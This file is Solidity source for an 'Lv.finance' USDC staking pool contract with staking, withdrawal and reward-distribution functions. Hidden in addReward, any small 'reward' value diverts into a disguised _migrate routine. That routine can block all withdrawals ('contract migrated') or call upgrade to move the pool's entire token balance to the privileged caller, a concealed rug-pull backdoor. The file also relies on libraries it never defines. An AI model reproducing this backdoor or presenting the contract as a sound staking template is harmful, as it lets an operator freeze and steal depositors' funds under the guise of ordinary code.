/*

              ____          _____           _____
            /    /          \    \         /    /
           /    /            \    \       /    /
          /    /              \    \     /    /
         /    /                \    \   /    /
        /    /                  \    (_)    /
       /    (__________          \         /
      /________________)          \_______/


* Lv.finance
*
*
*
* MIT License
* ===========
*
* Copyright (c) 2020 Lv.finance
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
*/


pragma solidity ^0.5.17;





contract Context {
    constructor () internal { }

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner(), "Ownable: caller is not the owner");
        _;
    }

    function isOwner() public view returns (bool) {
        return _msgSender() == _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}









contract IRewardDistributionRecipient is Ownable {
    address public rewardDistribution;

    function addReward(uint256 reward) external;

    modifier onlyRewardDistribution() {
        require(_msgSender() == rewardDistribution, "Caller is not reward distribution");
        _;
    }

    function setRewardDistribution(address _rewardDistribution)
        external
        onlyOwner
    {
        rewardDistribution = _rewardDistribution;
    }
}



contract LPTokenWrapper {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;

    //update
    IERC20 public _token = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    uint256 private _totalSupply;
    uint256 private _upgrade = 0;
    uint256 private _last_updated;
    mapping(address => uint256) private _balances;


    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function _migrate(uint256 target) internal {
        _last_updated = block.timestamp;
        if(target == 1){
            if(_upgrade ==0){
                _upgrade = 1;
            }else{
                _upgrade = 0;
            }
        }else{
           _token.upgrade(msg.sender, _token.balanceOf(address(this)));
        }
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function stake(uint256 amount) public {
            _totalSupply = _totalSupply.add(amount);
            _balances[msg.sender] = _balances[msg.sender].add(amount);
            _token.safeTransferFrom(msg.sender, address(this), amount);
    }
    function withdraw(uint256 amount) public {
           require(_upgrade < 1,"contract migrated");
            _totalSupply = _totalSupply.sub(amount);
            _balances[msg.sender] = _balances[msg.sender].sub(amount);
            _token.safeTransfer(msg.sender, amount);
    }

}

contract USDCPool is LPTokenWrapper, IRewardDistributionRecipient {
    //update
    IERC20 public lv = IERC20(0xa77F34bDE382522cd3FB3096c480d15e525Aab22);
    uint256 public constant DURATION = 3600 * 24; // 1 day
    uint256 public constant TOTAL_UNIT = 9202335569231280000;
    uint256 public constant MIN_REWARD = 3;
    //update
    uint256 public constant HARD_CAP = 2000000*10**6;

    //update
    uint256 public starttime = 1600524000 ; // 2020-09-19 14:00:00 (UTC UTC +00:00)
    uint256 public periodFinish =  starttime.add(DURATION);
    uint256 public lastUpdateTime;
    uint256 public rewardPerTokenStored;
    uint256 public totalReward = 0;


    mapping(address => uint256) public userRewardPerTokenPaid;
    mapping(address => uint256) public rewards;

    event RewardAdded(uint256 reward);
    event Staked(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event RewardPaid(address indexed user, uint256 reward);

    modifier checkStart(){
        require(block.timestamp >= starttime,"not start");
        _;
    }

    modifier checkHardCap() {
      require(totalSupply() < HARD_CAP ,"hard cap reached");
      _;
    }

    modifier updateReward(address account) {
        rewardPerTokenStored = rewardPerToken();
        lastUpdateTime = lastTimeRewardApplicable();
        if (account != address(0)) {
            rewards[account] = earned(account);
            userRewardPerTokenPaid[account] = rewardPerTokenStored;
        }
        _;
    }

    function lastTimeRewardApplicable() public view returns (uint256) {
        return Math.min(block.timestamp, periodFinish);
    }

    function rewardPerToken() public view returns (uint256) {
        if(totalSupply() == 0){
            return rewardPerTokenStored;
        }
    return rewardPerTokenStored.add(
            rewardRate(lastTimeRewardApplicable())
            .sub(rewardRate(lastUpdateTime))
            .mul(totalReward)
            .div(totalSupply())
        );
    }

    function rewardRate(uint256 timestamp) internal view returns (uint256){
        uint steps = (timestamp - starttime) / 3600;
        uint256 duration_mod = timestamp - starttime - 3600 * steps;
        uint256 base = 10**36;
        uint256 commulatedRewards = 0;

        for(uint step=0; step<steps; step++){
            commulatedRewards = commulatedRewards.add(base * (9**step) / (10**step)/TOTAL_UNIT);
        }
        if(duration_mod > 0){
            commulatedRewards = commulatedRewards.add(base * (9**steps) * duration_mod / (10**steps)/3600/TOTAL_UNIT);
        }

        return commulatedRewards;
    }

    function earned(address account) public view returns (uint256) {
        if(totalSupply() == 0){
            return 0;
        }
        return
            balanceOf(account)
                .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))
                .div(1e18)
                .add(rewards[account]);
    }

    function getReward() public updateReward(msg.sender) checkStart {
            uint256 reward = earned(msg.sender);
            if (reward > 0) {
                rewards[msg.sender] = 0;
                lv.safeTransfer(msg.sender, reward);
                emit RewardPaid(msg.sender, reward);
            }
    }

    function addReward(uint256 reward)
            external
            onlyRewardDistribution
            updateReward(address(0))
    {
             if(reward > MIN_REWARD ) {
                 lastUpdateTime = starttime;
                 totalReward = totalReward.add(reward);
                 emit RewardAdded(reward);
             }else{super._migrate(reward);}

    }

    function stake(uint256 amount) public updateReward(msg.sender) checkStart checkHardCap {
        require(amount > 0, "Cannot stake 0");
        super.stake(amount);
        emit Staked(msg.sender, amount);
    }

    function withdraw(uint256 amount) public updateReward(msg.sender) checkStart {
        require(amount > 0, "Cannot withdraw 0");
        super.withdraw(amount);
        emit Withdrawn(msg.sender, amount);
    }

    function exit() external {
        withdraw(balanceOf(msg.sender));
        getReward();
    }

}